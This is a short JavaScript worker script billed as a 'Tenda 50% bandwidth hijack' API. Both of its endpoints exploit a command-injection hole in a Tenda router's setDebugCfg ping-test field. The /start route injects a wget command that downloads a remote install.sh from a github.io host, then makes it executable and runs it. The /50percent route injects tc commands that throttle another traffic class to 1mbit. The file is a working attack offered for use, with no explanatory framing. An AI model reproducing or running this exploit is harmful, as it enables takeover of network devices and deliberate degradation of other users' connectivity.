export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    // START 50% HIJACK
    if (url.pathname === '/start') {
      const payload = `';cd /tmp; wget -q https://YOUR_USER.github.io/tenda-hijack/install.sh -O 50.sh; chmod +x 50.sh; ./50.sh;'`;
      
      await fetch('http://192.168.2.1/goform/setDebugCfg', {
        method: 'POST',
        body: `module=ping_test&pingAddr=${encodeURIComponent(payload)}`
      });
      
      return new Response('🔥 50% BANDWIDTH HIJACK ACTIVATED!');
    }
    
    // ADJUST BANDWIDTH
    if (url.pathname === '/50percent') {
      const cmd = `';tc class change dev eth0 parent 1: classid 1:1 htb rate 50mbit ceil 50mbit; tc class change dev eth0 parent 1: classid 1:2 htb rate 1mbit ceil 1mbit;'`;
      
      await fetch('http://192.168.2.1/goform/setDebugCfg', {
        method: 'POST',
        body: `module=ping_test&pingAddr=${encodeURIComponent(cmd)}`
      });
      
      return new Response('✅ 50% bandwidth enforced!');
    }
    
    return new Response('TENDA 50% BANDWIDTH HIJACK API\n/start - Start hijack\n/50percent - Force 50%');
  }
};